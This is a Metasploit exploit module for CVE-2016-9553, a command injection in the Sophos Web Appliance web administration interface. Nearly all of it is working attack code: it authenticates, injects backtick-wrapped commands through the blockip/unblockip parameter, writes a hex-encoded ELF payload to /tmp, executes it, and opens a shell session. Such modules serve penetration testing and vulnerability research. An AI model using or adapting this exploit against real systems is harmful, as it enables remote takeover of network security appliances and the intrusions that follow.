# Exploit Title: Sophos Web Appliance UnBlock/Block-IP Remote Command Injection Vulnerablity 
# Date: 12/12/2016
# Exploit Author: xort @ Critical Start
# Vendor Homepage: www.sophos.com 
# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
# Version: 4.2.1.3
# Tested on: 4.2.1.3
#            
# CVE : CVE-2016-9553

# vuln 1: unblockip parameter / MgrReport.php exploit
# vuln 2: blockip parameter   / MgrReport.php exploit

# Description PostAuth Sophos Web App FW <= v4.2.1.3 for capablities. This exploit leverages a command injection bug. 
#
# xort @ Critical Start

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking
	include  Exploit::Remote::Tcp
        include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sophos Web Appliace <= v4.2.1.3 block/unblock remote exploit',
					'Description'    => %q{
					This module exploits two 2 seperate remote command injecection vulnerabilities in
				the Sophos Web Appliace Version <=  v4.2.1.3 the web administration interface.
					By sending a specially crafted request it's possible to inject system
				 commands 
			},
			'Author'         =>
				[
					'xort', # vuln + metasploit module
				],
			'Version'        => '$Revision: 2 $',
			'References'     =>
				[
					[ 'none', 'none'],
				],
			'Platform'      => [ 'linux'],
			'Privileged'     => true,
			 'Arch'          => [ ARCH_X86 ],
                        'SessionTypes'  => [ 'shell' ],
                        'Privileged'     => false,

		        'Payload'        =>
                                { 
                                  'Compat' =>
                                  {
                                        'ConnectionType' => 'find',
                                  }
                                },

			'Targets'        =>
				[
					[
						'blockip method',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux',
								'VulnName' => 'blockip',
								'VulnNum' => '1',
						},
					],	
					[
						'unblockip method',
						{
								'Arch' => ARCH_X86,
								'Platform' => 'linux',
								'VulnName' => 'unblockip',
								'VulnNum' => '2',
						},
					],
				],
			'DefaultTarget' => 0))

			register_options(
				[
					OptString.new('PASSWORD', [ false, 'Device password', "" ]),	
			         	OptString.new('USERNAME', [ true, 'Device password', "admin" ]),	
					OptString.new('CMD', [ false, 'Command to execute', "" ]),	
					Opt::RPORT(443),
				], self.class)
	end


        def do_login(username, password_clear)
                vprint_status( "Logging into machine with credentials...\n" )

                # vars
                timeout = 11550;
                style_key = Rex::Text.rand_text_hex(32)

                # send request  
                res = send_request_cgi(
                {
                      'method'  => 'POST',
                      'uri'     => "/index.php",
                      'vars_get' => {
			   'c' => 'login',
			},
                      'vars_post' =>
                        {

       			  'STYLE' => style_key,
 			  'destination' => '',
			  'username' => username,
			  'password' => password_clear,
                        }
                }, timeout)

                return style_key
        end

	def run_command(username, style_password, cmd)
		vprint_status( "Running Command...\n" )

		# random attack method from calling methods into  
		calling_commands = [ 'report','trend_volume','trend_suspect','top_app_ctrl','perf_latency','perf_throughput','users_browse_summary','traf_sites','traf_blocked','traf_users','users_virus_downloaders','users_pua_downloaders','users_highrisk','users_policy_violators','users_top_users_by_browse_time','users_quota','users_browse_time_by_user','users_top_users_by_category','users_site_visits_by_user','users_category_visits_by_user','users_monitored_search_queries','users_app_ctrl','traf_category','traf_download' ,'warned_sites' ]

		# select random calling page that calls the vulnerable page MgrReport.php where the vulns are
		attack_method = calling_commands[rand(calling_commands.length)]

                # random filename to dump too + 'tmp' HAS to be here.
                b64dumpfile = "/tmp/" + rand_text_alphanumeric(4+rand(4))

		vprint_status( "Attacking Vuln #" + target['VulnNum']+ " - " + target['VulnName'] + " with " + attack_method  + "command method" )
		res = send_request_cgi({
			'method' => 'GET',
			'uri' => '/index.php?c=trend_suspect&' + target['VulnName'] + '=1.2.3.6`'+ cmd +'`&STYLE='+style_password
		})

	end

	def exploit
		# timeout
		timeout = 1550;

		# params
		password_clear = datastore['PASSWORD']
		user = datastore['USERNAME']
		
		style_hash = do_login(user, password_clear)
	
		vprint_status("STATUS hash authenticated: #{style_hash}\n")

		sleep(5)

		 #if no 'CMD' string - add code for root shell
                if not datastore['CMD'].nil? and not datastore['CMD'].empty?

                        cmd = datastore['CMD']

                        # Encode cmd payload
                        encoded_cmd = cmd.unpack("H*").join().gsub(/(\w)(\w)/,'\\x\1\2')

                        # kill stale calls to bdump from previous exploit calls for re-use
                        run_command(user, style_hash, ("sudo /bin/rm -f /tmp/n ;printf \"#{encoded_cmd}\" > /tmp/n; chmod +rx /tmp/n ; /tmp/n" ))
                else
                        # Encode payload to ELF file for deployment
                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
                        encoded_elf = elf.unpack("H*").join().gsub(/(\w)(\w)/,'\\\\\\x\1\2')

			# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
                        run_command(user, style_hash, ("echo%20-e%20#{encoded_elf}\>%20/tmp/m\;chmod%20%2brx%20/tmp/m\;/tmp/m"))
			# wait for magic
                        handler
			
                end


	end
end
